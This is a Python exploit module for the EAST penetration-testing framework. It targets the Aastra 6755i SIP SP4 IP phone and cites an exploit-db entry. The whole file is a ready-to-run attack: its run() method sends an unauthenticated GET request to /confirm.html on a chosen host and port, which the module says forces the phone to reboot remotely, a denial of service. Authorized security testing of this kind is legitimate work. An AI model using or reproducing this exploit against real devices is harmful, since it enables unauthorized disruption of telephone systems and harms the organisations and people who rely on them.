#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import os
import sys

import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_aastra_6755i_SIP_SP4_dos"
INFO['DESCRIPTION'] = "Aastra 6755i SIP SP4 - Unauthorized Remote Reboot"
INFO['VENDOR'] = "http://www.aastra.sg/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/44142/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Unauthorized Remote Reboot by simple GET request
"""

INFO['CHANGELOG'] = "19 Feb, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1', dict(description = 'Target IP')
OPTIONS["PORT"] = 8181, dict(description = 'Target PORT')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.ssl = False
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        self.host = self.args.get('HOST', self.host)
    
    def make_url(self, path = ''):
        return '{}{}:{}{}'.format(self.prot(), self.host, self.port, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    #def check(self):
    #    u = self.make_url('/crashlog.html')
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        url = self.make_url('/confirm.html')
        try:
            fd = urllib2.urlopen(url)
        except Exception as e:
            self.log(e)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
